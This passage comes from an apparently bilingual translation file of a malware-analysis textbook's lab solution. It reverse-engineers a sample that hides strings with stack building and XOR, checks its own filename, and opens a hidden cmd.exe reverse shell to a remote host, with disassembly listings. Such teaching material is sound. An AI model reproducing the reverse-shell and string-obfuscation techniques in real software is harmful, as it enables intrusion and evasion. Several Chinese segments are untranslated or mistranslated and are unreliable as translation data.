    main 上，因为我们想专注于它。
- en: '**Decoding Stack-Formed Strings**'
  id: totrans-2288
  prefs: []
  type: TYPE_NORMAL
  zh: '**解码栈形成的字符串**'
- en: If we click the **Run** button, we hit the first breakpoint at main. The first
    thing to notice is a large series of mov instructions moving single bytes into
    local variables beginning at , as shown in Listing 9-4L.
  id: totrans-2289
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们点击**运行**按钮，我们会在 main 处遇到第一个断点。首先要注意的是一系列 mov 指令，它们将单个字节移动到从  开始的局部变量中，如列表
    9-4L 所示。
- en: 00401128 push ebp
  id: totrans-2290
  prefs: []
  type: TYPE_NORMAL
  zh: 00401128 push ebp
- en: 00401129 mov ebp, esp
  id: totrans-2291
  prefs: []
  type: TYPE_NORMAL
  zh: 00401129 mov ebp, esp
- en: 0040112B sub esp, 304h
  id: totrans-2292
  prefs: []
  type: TYPE_NORMAL
  zh: 0040112B sub esp, 304h
- en: 00401131 push esi
  id: totrans-2293
  prefs: []
  type: TYPE_NORMAL
  zh: 00401131 push esi
- en: 00401132 push edi
  id: totrans-2294
  prefs: []
  type: TYPE_NORMAL
  zh: 00401132 push edi
- en: 00401133 mov [ebp+var_1B0], 31h 
  id: totrans-2295
  prefs: []
  type: TYPE_NORMAL
  zh: 00401133 mov [ebp+var_1B0], 31h 
- en: 0040113A mov [ebp+var_1AF], 71h
  id: totrans-2296
  prefs: []
  type: TYPE_NORMAL
  zh: 0040113A mov [ebp+var_1AF], 71h
- en: 00401141 mov [ebp+var_1AE], 61h
  id: totrans-2297
  prefs: []
  type: TYPE_NORMAL
  zh: 00401141 mov [ebp+var_1AE], 61h
- en: 00401148 mov [ebp+var_1AD], 7Ah
  id: totrans-2298
  prefs: []
  type: TYPE_NORMAL
  zh: 00401148 mov [ebp+var_1AD], 7Ah
- en: 0040114F mov [ebp+var_1AC], 32h
  id: totrans-2299
  prefs: []
  type: TYPE_NORMAL
  zh: 0040114F mov [ebp+var_1AC], 32h
- en: 00401156 mov [ebp+var_1AB], 77h
  id: totrans-2300
  prefs: []
  type: TYPE_NORMAL
  zh: 00401156 mov [ebp+var_1AB], 77h
- en: 0040115D mov [ebp+var_1AA], 73h
  id: totrans-2301
  prefs: []
  type: TYPE_NORMAL
  zh: 0040115D mov [ebp+var_1AA], 73h
- en: 00401164 mov [ebp+var_1A9], 78h
  id: totrans-2302
  prefs: []
  type: TYPE_NORMAL
  zh: 00401164 mov [ebp+var_1A9], 78h
- en: 0040116B mov [ebp+var_1A8], 33h
  id: totrans-2303
  prefs: []
  type: TYPE_NORMAL
  zh: 0040116B mov [ebp+var_1A8], 33h
- en: 00401172 mov [ebp+var_1A7], 65h
  id: totrans-2304
  prefs: []
  type: TYPE_NORMAL
  zh: 00401172 mov [ebp+var_1A7], 65h
- en: 00401179 mov [ebp+var_1A6], 64h
  id: totrans-2305
  prefs: []
  type: TYPE_NORMAL
  zh: 00401179 mov [ebp+var_1A6], 64h
- en: 00401180 mov [ebp+var_1A5], 63h
  id: totrans-2306
  prefs: []
  type: TYPE_NORMAL
  zh: 00401180 mov [ebp+var_1A5], 63h
- en: 00401187 mov [ebp+var_1A4], 0 
  id: totrans-2307
  prefs: []
  type: TYPE_NORMAL
  zh: 00401187 mov [ebp+var_1A4], 0 
- en: '**540**'
  id: totrans-2308
  prefs: []
  type: TYPE_NORMAL
  zh: '**540**'
- en: Appendix C
  id: totrans-2309
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2310
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040118E mov [ebp+Str1], 6Fh 00401195 mov [ebp+var_19F], 63h
  id: totrans-2311
  prefs: []
  type: TYPE_NORMAL
  zh: 0040118E mov [ebp+Str1], 6Fh 00401195 mov [ebp+var_19F], 63h
- en: 0040119C mov [ebp+var_19E], 6Ch
  id: totrans-2312
  prefs: []
  type: TYPE_NORMAL
  zh: 0040119C mov [ebp+var_19E], 6Ch
- en: 004011A3 mov [ebp+var_19D], 2Eh
  id: totrans-2313
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A3 mov [ebp+var_19D], 2Eh
- en: 004011AA mov [ebp+var_19C], 65h
  id: totrans-2314
  prefs: []
  type: TYPE_NORMAL
  zh: 004011AA mov [ebp+var_19C], 65h
- en: 004011B1 mov [ebp+var_19B], 78h
  id: totrans-2315
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B1 mov [ebp+var_19B], 78h
- en: 004011B8 mov [ebp+var_19A], 65h
  id: totrans-2316
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B8 mov [ebp+var_19A], 65h
- en: 004011BF mov [ebp+var_199], 0 
  id: totrans-2317
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BF mov [ebp+var_199], 0 
- en: '*Listing 9-4L: Building an ASCII string on the stack, one character at a time*
    This code builds two ASCII strings by moving each character onto the stack followed
    by NULL terminators at  and , which is a popular method for string obfuscation.
    The obfuscated strings will be referenced by the first variable of the string,
    which will give us the full NULL-terminated ASCII string. We single-step over
    these moves to look for signs of these strings being **9**'
  id: totrans-2318
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 9-4L：逐个字符在栈上构建 ASCII 字符串* 这段代码通过将每个字符移动到栈上，然后跟随  和  处的空终止符来构建两个 ASCII
    字符串，这是一种流行的字符串混淆方法。混淆的字符串将通过字符串的第一个变量引用，这将给我们完整的空终止 ASCII 字符串。我们逐条执行这些移动以寻找这些字符串的迹象。'
- en: created on the stack in the lower-right pane. We stop executing at 0x4011C6,
    right-click EBP, and select **Follow in Dump.** By scrolling up to the first string
  id: totrans-2319
  prefs: []
  type: TYPE_NORMAL
  zh: 在栈的右下角创建。我们在 0x4011C6 处停止执行，右键单击 EBP，并选择**在转储中跟踪**。通过向上滚动到第一个字符串
- en: '[EBP-1B0], we can see the string 1qaz2wsx3edc being created. The second string
    is created at [EBP-1A0] and named ocl.exe.'
  id: totrans-2320
  prefs: []
  type: TYPE_NORMAL
  zh: '[EBP-1B0]，我们可以看到字符串 1qaz2wsx3edc 被创建。第二个字符串在 [EBP-1A0] 处创建，命名为 ocl.exe。'
- en: '**Filename Check**'
  id: totrans-2321
  prefs: []
  type: TYPE_NORMAL
  zh: '**文件名检查**'
- en: After these strings are created, we can see a call to GetModuleFileNameA in
    Listing 9-5L at , and then a function call within the *Lab09-02.exe* malware
    to 0x401550\. If we try to analyze this function in OllyDbg, we’ll find that it’s
    rather complicated. If we examine it in IDA Pro, we’ll see that it is the C runtime
    library function _strrchr. OllyDbg missed this due to the lack of symbol support.
    If we load the binary into IDA Pro, we can let IDA Pro use its FLIRT
  id: totrans-2322
  prefs: []
  type: TYPE_NORMAL
  zh: 在这些字符串创建之后，我们可以在列表 9-5L 中看到对 GetModuleFileNameA 的调用（在  处），然后是 *Lab09-02.exe*
    恶意软件中对 0x401550 的函数调用。如果我们尝试在 OllyDbg 中分析此函数，我们会发现它相当复杂。如果我们使用 IDA Pro 检查它，我们会看到它是
    C 运行时库函数 _strrchr。OllyDbg 由于缺乏符号支持而错过了这一点。如果我们将二进制文件加载到 IDA Pro 中，我们可以让 IDA Pro
    使用其 FLIRT
- en: signature detection to correctly identify these APIs, as shown as shown at .
  id: totrans-2323
  prefs: []
  type: TYPE_NORMAL
  zh: 通过如图所示的签名检测来正确识别这些 API，如图所示。
- en: 00401208 call ds:GetModuleFileNameA 
  id: totrans-2324
  prefs: []
  type: TYPE_NORMAL
  zh: 00401208 call ds:GetModuleFileNameA 
- en: 0040120E push 5Ch ; Ch
  id: totrans-2325
  prefs: []
  type: TYPE_NORMAL
  zh: 0040120E push 5Ch ; Ch
- en: 00401210 lea ecx, [ebp+Str]
  id: totrans-2326
  prefs: []
  type: TYPE_NORMAL
  zh: 00401210 lea ecx, [ebp+Str]
- en: 00401216 push ecx ; Str
  id: totrans-2327
  prefs: []
  type: TYPE_NORMAL
  zh: 00401216 push ecx ; Str
- en: 00401217 call **_strrchr** 
  id: totrans-2328
  prefs: []
  type: TYPE_NORMAL
  zh: 00401217 call **_strrchr** 
- en: '*Listing 9-5L: IDA Pro labels strrchr properly, but OllyDbg does not.*'
  id: totrans-2329
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 9-5L：IDA Pro 正确标记 strrchr，但 OllyDbg 不正确。*'
- en: Let’s verify this by setting a breakpoint on the call at 0x401217\. We can see
    two arguments being pushed on the stack. The first is a forward slash, and the
    second is the value being returned from the GetModuleFileNameA call, which would
    be the current name of the executable. The malware is searching backward for a
    forward slash (0x5C character) in an attempt to get the name (rather than the
    full path) of the executable being executed. If we step-over the call to _strrchr,
    we can see that EAX is pointing to the string
  id: totrans-2330
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们通过在 0x401217 处的调用上设置断点来验证这一点。我们可以看到两个参数被推送到堆栈上。第一个是正斜杠，第二个是从 GetModuleFileNameA
    调用返回的值，这将是被执行的可执行文件的当前名称。恶意软件正在向后搜索正斜杠（0x5C 字符），试图获取被执行的可执行文件名称（而不是完整路径）。如果我们单步跳过
    _strrchr 的调用，我们可以看到 EAX 指向的字符串
- en: \Lab09-02.exe.
  id: totrans-2331
  prefs: []
  type: TYPE_NORMAL
  zh: \Lab09-02.exe.
- en: The next function call (0x4014C0) reveals a situation similar to _strrchr.
  id: totrans-2332
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个函数调用（0x4014C0）揭示了一个类似于 _strrchr 的情况。
- en: IDA Pro identifies this function as _strcmp, as shown in Listing 9-6L.
  id: totrans-2333
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro 将此函数识别为 _strcmp，如图 9-6L 所示。
- en: Solutions to Labs
  id: totrans-2334
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**541**'
  id: totrans-2335
  prefs: []
  type: TYPE_NORMAL
  zh: '**541**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2336
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040121F mov [ebp+Str2], eax
  id: totrans-2337
  prefs: []
  type: TYPE_NORMAL
  zh: 0040121F mov [ebp+Str2], eax
- en: 00401222 mov edx, [ebp+Str2]
  id: totrans-2338
  prefs: []
  type: TYPE_NORMAL
  zh: 00401222 mov edx, [ebp+Str2]
- en: 00401225 add edx, 1 
  id: totrans-2339
  prefs: []
  type: TYPE_NORMAL
  zh: 00401225 添加 edx, 1 
- en: 00401228 mov [ebp+Str2], edx
  id: totrans-2340
  prefs: []
  type: TYPE_NORMAL
  zh: 00401228 mov [ebp+Str2], edx
- en: 0040122B mov eax, [ebp+Str2]
  id: totrans-2341
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122B mov eax, [ebp+Str2]
- en: 0040122E push eax ; Str2
  id: totrans-2342
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122E push eax ; Str2
- en: 0040122F lea ecx, [ebp+Str1]
  id: totrans-2343
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122F lea ecx, [ebp+Str1]
- en: 00401235 push ecx ; Str1
  id: totrans-2344
  prefs: []
  type: TYPE_NORMAL
  zh: 00401235 push ecx ; Str1
- en: 00401236 call **_strcmp**
  id: totrans-2345
  prefs: []
  type: TYPE_NORMAL
  zh: 00401236 call **_strcmp**
- en: '*Listing 9-6L: IDA Pro labels strcmp properly, but OllyDbg does not.*'
  id: totrans-2346
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 9-6L：IDA Pro 正确标记 strcmp，但 OllyDbg 不正确。*'
- en: We’ll determine which strings are being compared by setting a breakpoint on
    the call to _strcmp at 0x401236\. Once our breakpoint is hit, we can see the two
    strings being sent to the _strcmp call. The first is the pointer to the GetModuleFileNameA
    call (incremented by one at  to account for the forward slash), and the other
    is ocl.exe (our decoded string from earlier). If the strings match, EAX should
    contain 0, the test eax,eax will set the zero flag to true, and execution will
    then go to 0x40124C. If the condition is false, it looks like the program will
    exit, which explains why the malware terminated when we tried to execute it earlier.
    The malware must be named *ocl.exe* in order to properly execute.
  id: totrans-2347
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将通过在 0x401236 处调用 _strcmp 的调用上设置断点来确定正在比较哪些字符串。一旦我们的断点被触发，我们就可以看到发送到 _strcmp
    调用的两个字符串。第一个是指向 GetModuleFileNameA 调用的指针（在  处增加一以考虑正斜杠），另一个是 ocl.exe（我们之前解码的字符串）。如果字符串匹配，EAX
    应该包含 0，test eax,eax 将设置零标志为真，然后执行将转到 0x40124C。如果条件为假，看起来程序将退出，这解释了为什么我们在之前尝试执行它时恶意软件终止。恶意软件必须命名为
    *ocl.exe* 才能正确执行。
- en: Let’s rename the binary *ocl.exe* and set a breakpoint at 0x40124C. If our analysis
    is correct, the malware should not exit, and our breakpoint will be hit. Success!
    Our breakpoint was hit, and we can continue our analysis in OllyDbg.
  id: totrans-2348
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们将二进制文件重命名为 *ocl.exe* 并在 0x40124C 处设置断点。如果我们的分析是正确的，恶意软件不应该退出，并且我们的断点将被触发。成功！我们的断点被触发了，我们可以在
    OllyDbg 中继续我们的分析。
- en: '**Decoding XOR Encoded Strings**'
  id: totrans-2349
  prefs: []
  type: TYPE_NORMAL
  zh: '**解码 XOR 编码的字符串**'
- en: WSAStartup and WSASocket are imported, so we can assume some networking functionality
    is going to be taking place. The next major function call is at 0x4012BD to the
    function 0x401089\. Let’s set a breakpoint at 0x401089
  id: totrans-2350
  prefs: []
  type: TYPE_NORMAL
  zh: WSAStartup and WSASocket are imported, so we can assume some networking functionality
    is going to be taking place. The next major function call is at 0x4012BD to the
    function 0x401089\. Let’s set a breakpoint at 0x401089
- en: and inspect the stack for the arguments to this function call.
  id: totrans-2351
  prefs: []
  type: TYPE_NORMAL
  zh: and inspect the stack for the arguments to this function call.
- en: The two arguments being passed to this function are a stack buffer (encoded
    string) and the string 1qaz2wsx3edc (key string). We step-into the function and
    step to the call at 0x401440, which passes the key string to strlen. It returns
    0xC and moves it into [EBP-104]. Next, [EBP-108] is initialized to 0\. OllyDbg
    has noted a loop in progress, which makes sense since [EBP-108]
  id: totrans-2352
  prefs: []
  type: TYPE_NORMAL
  zh: The two arguments being passed to this function are a stack buffer (encoded
    string) and the string 1qaz2wsx3edc (key string). We step-into the function and
    step to the call at 0x401440, which passes the key string to strlen. It returns
    0xC and moves it into [EBP-104]. Next, [EBP-108] is initialized to 0\. OllyDbg
    has noted a loop in progress, which makes sense since [EBP-108]
- en: is a counter that is incremented at 0x4010DA and compared to 0x20 at 0x4010E3\.
    As the loop continues to execute, we see our key string going through an idiv
    and mov instruction sequence, as shown Listing 9-7L.
  id: totrans-2353
  prefs: []
  type: TYPE_NORMAL
  zh: is a counter that is incremented at 0x4010DA and compared to 0x20 at 0x4010E3\.
    As the loop continues to execute, we see our key string going through an idiv
    and mov instruction sequence, as shown in Listing 9-7L.
- en: 004010E3 cmp [ebp+var_108], 20h
  id: totrans-2354
  prefs: []
  type: TYPE_NORMAL
  zh: 004010E3 cmp [ebp+var_108], 20h
- en: 004010EA
  id: totrans-2355
  prefs: []
  type: TYPE_NORMAL
  zh: 004010EA
- en: jge short loc_40111D 
  id: totrans-2356
  prefs: []
  type: TYPE_NORMAL
  zh: jge short loc_40111D 
- en: 004010EC mov edx, [ebp+arg_4]
  id: totrans-2357
  prefs: []
  type: TYPE_NORMAL
  zh: 004010EC mov edx, [ebp+arg_4]
- en: 004010EF add edx, [ebp+var_108]
  id: totrans-2358
  prefs: []
  type: TYPE_NORMAL
  zh: 004010EF add edx, [ebp+var_108]
- en: 004010F5 movsx ecx, byte ptr [edx]
  id: totrans-2359
  prefs: []
  type: TYPE_NORMAL
  zh: 004010F5 movsx ecx, byte ptr [edx]
- en: 004010F8 mov eax, [ebp+var_108]
  id: totrans-2360
  prefs: []
  type: TYPE_NORMAL
  zh: 004010F8 mov eax, [ebp+var_108]
- en: 004010FE cdq
  id: totrans-2361
  prefs: []
  type: TYPE_NORMAL
  zh: 004010FE cdq
- en: 004010FF idiv [ebp+var_104]
  id: totrans-2362
  prefs: []
  type: TYPE_NORMAL
  zh: 004010FF idiv [ebp+var_104]
- en: '**542**'
  id: totrans-2363
  prefs: []
  type: TYPE_NORMAL
  zh: '**542**'
- en: Appendix C
  id: totrans-2364
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2365
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00401105 mov eax, [ebp+Str]
  id: totrans-2366
  prefs: []
  type: TYPE_NORMAL
  zh: 00401105 mov eax, [ebp+Str]
- en: 00401108 movsx edx, byte ptr [eax+edx] 
  id: totrans-2367
  prefs: []
  type: TYPE_NORMAL
  zh: 00401108 movsx edx, byte ptr [eax+edx] 
- en: 0040110C xor ecx, edx 
  id: totrans-2368
  prefs: []
  type: TYPE_NORMAL
  zh: 0040110C xor ecx, edx 
- en: 0040110E mov eax, [ebp+var_108]
  id: totrans-2369
  prefs: []
  type: TYPE_NORMAL
  zh: 0040110E mov eax, [ebp+var_108]
- en: 00401114 mov [ebp+eax+var_100], cl
  id: totrans-2370
  prefs: []
  type: TYPE_NORMAL
  zh: 00401114 mov [ebp+eax+var_100], cl
- en: 0040111B jmp short loc_4010D4
  id: totrans-2371
  prefs: []
  type: TYPE_NORMAL
  zh: 0040111B jmp short loc_4010D4
- en: '*Listing 9-7L: String decoding functionality*'
  id: totrans-2372
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 9-7L: String decoding functionality*'
- en: This is getting an index into the string. Notice the use of EDX after the idiv
    instruction at , which is using modulo to allow the malware to loop over the
    string in case the encoded string length is longer than our key string. We then
    see an interesting XOR at .
  id: totrans-2373
  prefs: []
  type: TYPE_NORMAL
  zh: This is getting an index into the string. Notice the use of EDX after the idiv
    instruction at , which is using modulo to allow the malware to loop over the
    string in case the encoded string length is longer than our key string. We then
    see an interesting XOR at .
- en: If we set a breakpoint at 0x4010F5, we can see which value is being pointed
    to by EDX and being moved into ECX, which will tell us the value that is getting
    XOR’ed later in the function. When we click **Follow in Dump** **9**
  id: totrans-2374
  prefs: []
  type: TYPE_NORMAL
  zh: If we set a breakpoint at 0x4010F5, we can see which value is being pointed
    to by EDX and being moved into ECX, which will tell us the value that is getting
    XOR’ed later in the function. When we click **Follow in Dump** **9**
- en: on EDX, we see that this is a pointer to the first argument to this function
    call (encoded string). ECX will contain 0x46, which is the first byte in the encoded
    string. We set a breakpoint at  to see what is being XOR’ed on the first iteration
    through the loop. We see that EDX will contain 0x31 (first byte of key string),
    and we again see that ECX will contain 0x46\.
  id: totrans-2375
  prefs: []
  type: TYPE_NORMAL
  zh: on EDX, we see that this is a pointer to the first argument to this function
    call (encoded string). ECX will contain 0x46, which is the first byte in the encoded
    string. We set a breakpoint at  to see what is being XOR’ed on the first iteration
    through the loop. We see that EDX will contain 0x31 (first byte of key string),
    and we again see that ECX will contain 0x46\.
- en: Let’s execute the loop a few more times and try to make sense of the string
    being decoded. After clicking play a few more times, we can see the string www.prac.
    This could be the start of a domain that the malware is trying to communicate
    with. Let’s continue until var_108 ([EBP-108], our counter variable) equals 0x20\.
    Once the jge short 0x40111D at  is taken, the final string placed into EAX is
    www.practicalmalwareanalysis.com (which happens to be of length 0x20), and the
    function will then return to the main function. This function decoded the string
    www.practicalmalwareanalysis.com by using a multibyte XOR loop of the string 1qaz2wsx3edc.
  id: totrans-2376
  prefs: []
  type: TYPE_NORMAL
  zh: Let’s execute the loop a few more times and try to make sense of the string
    being decoded. After clicking play a few more times, we can see the string www.prac.
    This could be the start of a domain that the malware is trying to communicate
    with. Let’s continue until var_108 ([EBP-108], our counter variable) equals 0x20\.
    Once the jge short 0x40111D at  is taken, the final string placed into EAX is
    www.practicalmalwareanalysis.com (which happens to be of length 0x20), and the
    function will then return to the main function. This function decoded the string
    www.practicalmalwareanalysis.com by using a multibyte XOR loop of the string 1qaz2wsx3edc.
- en: Back in the main function, we see EAX being passed to a gethostbyname call.
    This value will return an IP address, which will populate the sockaddr_in structure.
  id: totrans-2377
  prefs: []
  type: TYPE_NORMAL
  zh: 在主函数中，我们看到EAX被传递给gethostbyname调用。此值将返回一个IP地址，该地址将填充sockaddr_in结构。
- en: Next, we see a call to ntohs with an argument of 0x270f, or 9999 in decimal.
  id: totrans-2378
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们看到一个对ntohs的调用，其参数为0x270f，即十进制的9999。
- en: This argument is moved into a sockaddr_in structure along with 0x2, which represents
    AF_INET (the code for Internet sockets) in the sockaddr_in structure.
  id: totrans-2379
  prefs: []
  type: TYPE_NORMAL
  zh: 这个参数被移动到一个sockaddr_in结构中，并带有0x2，它在sockaddr_in结构中代表AF_INET（互联网套接字的代码）。
- en: The next call will connect the malware to *www.practicalmalwareanalysis.com*
    on TCP port 9999\. If the connection succeeds, the malware will continue executing
    until 0x40137A. If it fails, the malware will sleep for 30 seconds, go back to
    the beginning of the main function, and repeat the process again. We can use Netcat
    and ApateDNS to fool the malware into connecting back to an IP we control.
  id: totrans-2380
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个调用将恶意软件连接到*www.practicalmalwareanalysis.com*上的TCP端口9999。如果连接成功，恶意软件将继续执行，直到0x40137A。如果失败，恶意软件将休眠30秒，回到主函数的开始处，并重复此过程。我们可以使用Netcat和ApateDNS来欺骗恶意软件，使其连接到我们控制的IP地址。
- en: If we step-into the function call made at 0x4013a9 (step-into 0x401000), we
    see two function calls to 0x4013E0\. Again, this is another example where OllyDbg
    does not identify a system call of memset, whereas IDA Pro does identify the function.
    Next, we see a call to CreateProcessA at 0x40106E, as shown in Listing 9-8L. Before
    the call, some structure is being populated. We’ll turn to IDA Pro to shed some
    light on what’s going on here.
  id: totrans-2381
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们单步执行0x4013a9（单步执行0x401000）处的函数调用，我们会看到两次对0x4013E0的函数调用。这又是OllyDbg没有识别出memset系统调用，而IDA
    Pro却识别出该函数的另一个例子。接下来，我们看到在0x40106E处对CreateProcessA的调用，如列表9-8L所示。在调用之前，一些结构正在被填充。我们将转向IDA
    Pro来揭示这里发生了什么。
- en: Solutions to Labs
  id: totrans-2382
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室解决方案**'
- en: '**543**'
  id: totrans-2383
  prefs: []
  type: TYPE_NORMAL
  zh: '**543**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2384
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Reverse Shell Analysis**'
  id: totrans-2385
  prefs: []
  type: TYPE_NORMAL
  zh: '**反向shell分析**'
- en: This appears to be a reverse shell, created using a method that’s popular among
    malware authors. In this method, the STARTUPINFO structure that is passed to CreateProcessA
    is manipulated. CreateProcessA is called, and it runs *cmd.exe* with its window
    suppressed, so that it isn’t visible to the user under attack. Before the call
    to CreateProcessA, a socket is created and a connection is established to a remote
    server. That socket is tied to the standard streams (stdin, stdout, and stderr)
    for *cmd.exe*.
  id: totrans-2386
  prefs: []
  type: TYPE_NORMAL
  zh: 这似乎是一个反向shell，使用的是恶意软件作者中流行的创建方法。在这个方法中，传递给CreateProcessA的STARTUPINFO结构被操作。调用CreateProcessA，并以窗口隐藏的方式运行*cmd.exe*，这样在攻击者用户看来是不可见的。在调用CreateProcessA之前，创建了一个套接字，并与远程服务器建立了连接。该套接字与*cmd.exe*的标准流（stdin、stdout和stderr）相关联。
- en: Listing 9-8L shows this method of reverse shell creation in action.
  id: totrans-2387
  prefs: []
  type: TYPE_NORMAL
  zh: 列表9-8L显示了反向shell创建方法的实际操作。
- en: 0040103B mov [ebp+StartupInfo.wShowWindow], **SW_HIDE** 
  id: totrans-2388
  prefs: []
  type: TYPE_NORMAL
  zh: 0040103B mov [ebp+StartupInfo.wShowWindow], **SW_HIDE** 
- en: 00401041 mov edx, [ebp+**Socket**]
  id: totrans-2389
  prefs: []
  type: TYPE_NORMAL
  zh: 00401041 mov edx, [ebp+**Socket**]
- en: 00401044 mov [ebp+StartupInfo. **hStdInput**], edx 
  id: totrans-2390
  prefs: []
  type: TYPE_NORMAL
  zh: 00401044 mov [ebp+StartupInfo. **hStdInput**], edx 
- en: 00401047 mov eax, [ebp+StartupInfo.hStdInput]
  id: totrans-2391
  prefs: []
  type: TYPE_NORMAL
  zh: 00401047 mov eax, [ebp+StartupInfo.hStdInput]
- en: 0040104A mov [ebp+StartupInfo. **hStdError**], eax 
  id: totrans-2392
  prefs: []
  type: TYPE_NORMAL
  zh: 0040104A mov [ebp+StartupInfo. **hStdError**], eax 
- en: 0040104D mov ecx, [ebp+StartupInfo.hStdError]
  id: totrans-2393
  prefs: []
  type: TYPE_NORMAL
  zh: 0040104D mov ecx, [ebp+StartupInfo.hStdError]
- en: 00401050 mov [ebp+StartupInfo. **hStdOutput**], ecx 
  id: totrans-2394
  prefs: []
  type: TYPE_NORMAL
  zh: 00401050 mov [ebp+StartupInfo. **hStdOutput**], ecx 
- en: 00401053 lea edx, [ebp+ProcessInformation]
  id: totrans-2395
  prefs: []
  type: TYPE_NORMAL
  zh: 00401053 lea edx, [ebp+ProcessInformation]
- en: 00401056 push edx ; lpProcessInformation
  id: totrans-2396
  prefs: []
  type: TYPE_NORMAL
  zh: 00401056 push edx ; lpProcessInformation
- en: 00401057 lea eax, [ebp+StartupInfo]
  id: totrans-2397
  prefs: []
  type: TYPE_NORMAL
  zh: 00401057 lea eax, [ebp+StartupInfo]
- en: 0040105A push eax ; lpStartupInfo
  id: totrans-2398
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105A push eax ; lpStartupInfo
- en: 0040105B push 0 ; lpCurrentDirectory
  id: totrans-2399
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105B push 0 ; lpCurrentDirectory
- en: 0040105D push 0 ; lpEnvironment
  id: totrans-2400
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105D push 0 ; lpEnvironment
- en: 0040105F push 0 ; dwCreationFlags
  id: totrans-2401
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105F push 0 ; dwCreationFlags
- en: 00401061 push 1 ; bInheritHandles
  id: totrans-2402
  prefs: []
  type: TYPE_NORMAL
  zh: 00401061 push 1 ; bInheritHandles
- en: 00401063 push 0 ; lpThreadAttributes
  id: totrans-2403
  prefs: []
  type: TYPE_NORMAL
  zh: 00401063 push 0 ; lpThreadAttributes
- en: 00401065 push 0 ; lpProcessAttributes
  id: totrans-2404
  prefs: []
  type: TYPE_NORMAL
  zh: 00401065 push 0 ; lpProcessAttributes
- en: 00401067 push offset CommandLine ; " **cmd**" 
  id: totrans-2405
  prefs: []
  type: TYPE_NORMAL
  zh: 00401067 push offset CommandLine ; " **cmd**" 
- en: 0040106C push 0 ; lpApplicationName
  id: totrans-2406
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106C push 0 ; lpApplicationName
- en: 0040106E call ds:**CreateProcessA**
  id: totrans-2407
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106E call ds:**CreateProcessA**
- en: '*Listing 9-8L: Creating a reverse shell using CreateProcessA and the STARTUPINFO
    structure* The STARTUPINFO structure is manipulated, and then parameters are passed
    to CreateProcessA. We see that CreateProcessA is going to run *cmd.exe* because
    it is passed as a parameter at . The wShowWindow member of the structure is set
    to SW_HIDE at , which will hide *cmd.exe*’s window when it is launched. At ,
    , and , we see that the standard streams in the STARTUPINFO structure are set
    to the socket. This directly ties the standard streams to the socket for *cmd.exe*,
    so when it is launched, all of the data that comes over the socket will be sent
    to *cmd.exe*, and all output generated by *cmd.exe* will be sent over the socket.'
  id: totrans-2408
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 9-8L：使用 CreateProcessA 和 STARTUPINFO 结构创建反向shell* STARTUPINFO 结构被操作，然后传递参数给
    CreateProcessA。我们看到 CreateProcessA 将运行 *cmd.exe*，因为它在  处作为参数传递。结构中的 wShowWindow
    成员被设置为 SW_HIDE 在 ，这将隐藏在启动时 *cmd.exe* 的窗口。在 、 和  处，我们看到 STARTUPINFO 结构中的标准流被设置为套接字。这直接将标准流与
    *cmd.exe* 的套接字绑定，因此当它启动时，通过套接字传输的所有数据都将发送到 *cmd.exe*，而 *cmd.exe* 生成的所有输出都将通过套接字发送。'
- en: In summary, we determined that this malware is a simple reverse shell with obfuscated
    strings that must be renamed *ocl.exe* before it can be run successfully. The
    strings are obfuscated using the stack and a multibyte XOR. In Chapter 13, we
    will cover data-encoding techniques like this in more detail.
  id: totrans-2409
  prefs: []
  type: TYPE_NORMAL
  zh: 总结来说，我们确定这种恶意软件是一个简单的反向shell，具有混淆的字符串，必须在运行成功之前将其重命名为 *ocl.exe*。这些字符串使用栈和多字节XOR进行混淆。在第13章中，我们将更详细地介绍这种数据编码技术。
- en: '**544**'
  id: totrans-2410
  prefs: []
  type: TYPE_NORMAL
  zh: '**544**'
- en: Appendix C
  id: totrans-2411
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2412
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 122](index-578_1.png)'
  id: totrans-2413
  prefs: []
  type: TYPE_IMG
  zh: '![Image 122](index-578_1.png)'
- en: '**Lab 9-3 Solutions**'
  id: totrans-2414
  prefs: []
  type: TYPE_NORMAL
